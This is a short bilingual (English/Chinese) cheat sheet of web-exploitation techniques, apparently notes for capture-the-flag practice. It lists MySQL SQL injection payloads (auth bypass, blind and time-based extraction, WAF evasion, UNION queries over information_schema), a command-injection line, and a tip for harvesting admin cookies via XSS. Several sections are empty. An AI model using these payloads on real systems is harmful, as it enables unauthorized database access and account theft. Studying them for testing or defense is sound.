# Web

# Table of Contents
* [Tools](#Tools)
* [F12](#F12)
* [Commands](#Commands)
* [PHP](#PHP)
* [HTTP 302](#HTTP-302)
* [Directory Listing](#Directory-Listing)
* [Cookie](#Cookie)
* [SQL Injection](#SQL-Injection)
  * [MySQL](#MySQL)
* [XSS Injection](#XSS-Injection)
* [Command Injection](#Command-Injection)
* [XML Injection](#XML-Injection)

## Tools
* [HackBar](https://chrome.google.com/webstore/detail/hackbar/ejljggkpbkchhfcplgpaegmbfhenekdc) : A simple security audit / Penetration test tool for testing sql injections, XSS holes and site security.
* [Wayback Machine](https://archive.org/web/) : Explore web pages saved over time.
* [RequestBin](https://requestbin.com/) : Get a URL that collects requests you send it. (Can be used with XSS to get admin cookies)

## F12
* Check Network header/response
* Use console to do js function overwrite

## Commands
* `curl https://...` : 取得網頁內容，螢幕輸出

## PHP
* [Magic Hashes](https://github.com/spaze/hashes)
  * For php, `'0e123' == '00e456' == '0'` since they all translate to float 0 (0e followed by digits is interpreted as scientific notation)

## HTTP 302
* **Moved Temporarily**, 可以簡單的理解為該資源原本確實存在，但已經被臨時改變了位置；換而言之，就是請求的資源暫時駐留在不同的URI下。
* `curl` only redirects when adding parameter `-L`
* Use `curl` to view the original page

## Directory Listing

## Cookie

## SQL Injection
### MySQL
* `'or 1 = 1 -- `
* 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
  * 從offset=1開始選取前50筆資料(略過最前面1筆)
  * `limit 1,50`
* Blind sql injection
  * 有時候資料庫查詢只會顯示成功或失敗，不會顯示資料
  * 透過True/Flase回傳去判斷
    * `id = 'admin' and ascii(mid(password, 1, 1))>0 --` => True
    * `id = 'admin' and ascii(mid(password, 1, 1))>100 --` => False
    * `mid()` : 從字串索引值 start 開始截取共 length 長度的字串
  * 沒有回傳可以透過時間
    * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
    * if(condition, when_true, when_false)
* Bypass WAF
  * 對大小寫不敏感
  * 空白
    * /**/,%09, %0a, %0b, %0c, %0d, %a0
    * OR(1=1)
  * OR => ||, AND => &&
    * &直接傳過去是有特殊涵意的，例如?key1=value1&key2=value2
    * 用%26取代
  * = => LIKE
  * LIMIT 0,1 => LIMIT 1 OFFSET 0
* `@@version` : 同`version()`，回傳資料庫版本
* `user()` : 回傳使用者名稱
* `information_schema`
  * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
  * 透過leak information_schema取得想要的資料庫
  * databasename is at `information_schema.schemata`
  * tablename is at `information_schema.tables`
  * columnname is at `information_schema.columns`
  * leak database name
    * `'union select schema_name,1 from information_schema.schemata #`
    * can add `limit` to find certain information
  * leak table name
    * `'union select table_name,1 from information_schema.tables where table_schema like '$databasename'#`
  * leak column name
    * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
  * With the 3 information above found, leak the information
    * `'union select $columnname,1 from $databasename.$tablename#` 


## XSS Injection

## Command Injection
* `ping $whoami`

## XML Injection